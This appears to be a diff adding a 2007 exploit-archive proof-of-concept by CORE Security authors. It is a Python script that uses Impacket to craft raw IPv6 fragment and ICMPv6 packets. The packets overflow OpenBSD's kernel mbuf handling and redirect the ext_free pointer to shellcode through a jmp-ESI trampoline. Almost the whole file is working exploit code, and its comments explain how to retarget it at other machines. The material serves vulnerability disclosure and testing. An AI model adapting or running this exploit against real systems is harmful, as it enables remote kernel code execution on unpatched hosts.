@@ -1,0 +1,166 @@
+# The PoC executes the shellcode (int 3) and returns. It overwrites the 
+# ext_free() function pointer on the mbuf and forces a m_freem() on the 
+# overflowed packet. 
+#
+# The Impacket library is used to craft and send packets 
+# (http://oss.coresecurity.com/projects/impacket.html or download from 
+# Debian repositories) 
+#
+# Currently, only systems supporting raw sockets and the PF_PACKET family 
+# can run the included proof-of-concept code. 
+#
+# Tested against a system running "OpenBSD 4.0 CURRENT (GENERIC) Mon Oct 
+# 30" 
+#
+# To use the code to test a custom machine you will need to: 1) Adjust the 
+# MACADDRESS variable 2) Find the right trampoline value for your system 
+# and replace it in the code. To find a proper trampoline value use the 
+# following command: "objdump -d /bsd | grep esi | grep jmp" 3) Adjust the 
+# ICMP checksum 
+#
+# The exploit should stop on an int 3 and pressing "c" in ddb the kernel 
+# will continue normally. 
+#
+#
+# Description:
+#   OpenBSD ICMPv6 fragment remote execution PoC
+#
+# Author:
+#   Alfredo Ortega
+#   Mario Vilas
+#
+# Copyright (c) 2001-2007 CORE Security Technologies, CORE SDI Inc.
+# All rights reserved
+
+from impacket import ImpactPacket
+import struct
+import socket
+import time
+
+class BSD_ICMPv6_Remote_BO:
+    MACADDRESS = (0x00,0x0c,0x29,0x44,0x68,0x6f)
+    def Run(self):
+        self.s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
+        self.s.bind(('eth0',0x86dd))
+        sourceIP = '\xfe\x80\x00\x00\x00\x00\x00\x00\x02\x0f\x29\xff\xfe\x44\x68\x6f'  # source address
+        destIP   = '\xff\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01'  # destination address Multicast Link-level 
+        firstFragment, secondFragment = self.buildOpenBSDPackets(sourceIP,destIP)
+	validIcmp = self.buildValidICMPPacket(sourceIP,destIP)
+	
+	for i in range(100): # fill mbufs
+        	self.sendpacket(firstFragment)
+		self.sendpacket(validIcmp)
+		time.sleep(0.01)
+	for i in range(2): # Number of overflow packets to send. Increase if exploit is not reliable
+        	self.sendpacket(secondFragment)
+		time.sleep(0.1)
+        	self.sendpacket(firstFragment)
+		self.sendpacket(validIcmp)
+		time.sleep(0.1)
+
+    def sendpacket(self, data):
+        ipe = ImpactPacket.Ethernet()
+        ipe.set_ether_dhost(self.MACADDRESS)
+        ipd = ImpactPacket.Data(data)
+        ipd.ethertype = 0x86dd  # Ethertype for IPv6
+        ipe.contains(ipd)
+        p = ipe.get_packet()
+        self.s.send(p)
+
+    def buildOpenBSDPackets(self,sourceIP,destIP):
+        HopByHopLenght= 1
+
+        IPv6FragmentationHeader = ''
+        IPv6FragmentationHeader += struct.pack('!B', 0x3a)  # next header (00: Hop by Hop)
+        IPv6FragmentationHeader += struct.pack('!B', 0x00)  # reserverd
+        IPv6FragmentationHeader += struct.pack('!B', 0x00)  # offset
+        IPv6FragmentationHeader += struct.pack('!B', 0x01)  # offset + More fragments: yes
+        IPv6FragmentationHeader += struct.pack('>L', 0x0EADBABE) # id
+
+        IPv6HopByHopHeader  = ''
+        IPv6HopByHopHeader += struct.pack('!B', 0x2c)                    # next header (0x3A: ICMP)
+        IPv6HopByHopHeader += struct.pack('!B', HopByHopLenght )         # Hdr Ext Len (frutaaaaaaa :D )
+        IPv6HopByHopHeader += '\x00' *(((HopByHopLenght+1)*8)-2)         # Options
+
+        longitud = len(IPv6HopByHopHeader)+len(IPv6FragmentationHeader)
+	print longitud
+        IPv6Packet  = ''
+        IPv6Packet += struct.pack( '>L', 6 << 28 )      # version, traffic class, flow label
+        IPv6Packet += struct.pack( '>H', longitud )     # payload length
+        IPv6Packet += '\x00'                            # next header (2c: Fragmentation)
+        IPv6Packet += '\x40'                            # hop limit
+
+        IPv6Packet += sourceIP
+        IPv6Packet += destIP
+
+        firstFragment = IPv6Packet+IPv6HopByHopHeader+IPv6FragmentationHeader+('O'*150)
+
+	self.ShellCode =  ''
+        self.ShellCode += '\xcc' # int 3
+	self.ShellCode += '\x83\xc4\x20\x5b\x5e\x5f\xc9\xc3\xcc' #fix ESP and ret
+
+        ICMPv6Packet  = ''
+        ICMPv6Packet += '\x80'  # type (128 == Icmp echo request)
+        ICMPv6Packet += '\x00'  # code
+        ICMPv6Packet += '\xfb\x4e'  # checksum
+        ICMPv6Packet += '\x33\xf6'  # ID
+        ICMPv6Packet += '\x00\x00'  # sequence
+        ICMPv6Packet +=  ('\x90'*(212-len(self.ShellCode)))+self.ShellCode
+	# Start of the next mfub (we land here):
+	ICMPv6Packet += '\x90\x90\x90\x90\xE9\x3B\xFF\xFF' # jump backwards
+        ICMPv6Packet += '\xFFAAA\x01\x01\x01\x01AAAABBBBAAAABBBB' 
+	# mbuf+0x20:
+	trampoline = '\x8c\x23\x20\xd0' # jmp ESI on /bsd (find with "objdump -d /bsd | grep esi | grep jmp")
+        ICMPv6Packet += 'AAAAAAAA'+trampoline+'CCCCDDDDEEEEFFFFGGGG' 
+        longitud = len(ICMPv6Packet)
+
+
+	IPv6Packet  = ''
+        IPv6Packet += struct.pack( '>L', 6 << 28 )      # version, traffic class, flow label
+        IPv6Packet += struct.pack( '>H', longitud )     # payload length
+        IPv6Packet += '\x2c'                            # next header (2c: Fragmentation)
+        IPv6Packet += '\x40'                            # hop limit
+        IPv6Packet += sourceIP
+        IPv6Packet += destIP
+
+        IPv6FragmentationHeader = ''
+        IPv6FragmentationHeader += struct.pack('!B', 0x3a)  # next header (3A: icmpV6)
+        IPv6FragmentationHeader += struct.pack('!B', 0x00)  # reserverd
+        IPv6FragmentationHeader += struct.pack('!B', 0x00)  # offset
+        IPv6FragmentationHeader += struct.pack('!B', 0x00)  # offset + More fragments:no
+        IPv6FragmentationHeader += struct.pack('>L', 0x0EADBABE) # id
+
+        secondFragment = IPv6Packet+IPv6FragmentationHeader+ICMPv6Packet
+
+        return firstFragment, secondFragment
+
+
+
+    def buildValidICMPPacket(self,sourceIP,destIP):
+
+        ICMPv6Packet  = ''
+        ICMPv6Packet += '\x80'  # type (128 == Icmp echo request)
+        ICMPv6Packet += '\x00'  # code
+        ICMPv6Packet += '\xcb\xc4'  # checksum
+        ICMPv6Packet += '\x33\xf6'  # ID
+        ICMPv6Packet += '\x00\x00'  # sequence
+	ICMPv6Packet += 'T'*1232
+
+        longitud = len(ICMPv6Packet)
+
+        IPv6Packet  = ''
+        IPv6Packet += struct.pack( '>L', 6 << 28 )      # version, traffic class, flow label
+        IPv6Packet += struct.pack( '>H', longitud )     # payload length
+        IPv6Packet += '\x3A'                            # next header (2c: Fragmentation)
+        IPv6Packet += '\x40'                            # hop limit
+        IPv6Packet += sourceIP
+        IPv6Packet += destIP
+
+        icmpPacket = IPv6Packet+ICMPv6Packet
+
+        return  icmpPacket
+
+attack = BSD_ICMPv6_Remote_BO()
+attack.Run()
+
+# milw0rm.com [2007-03-15]
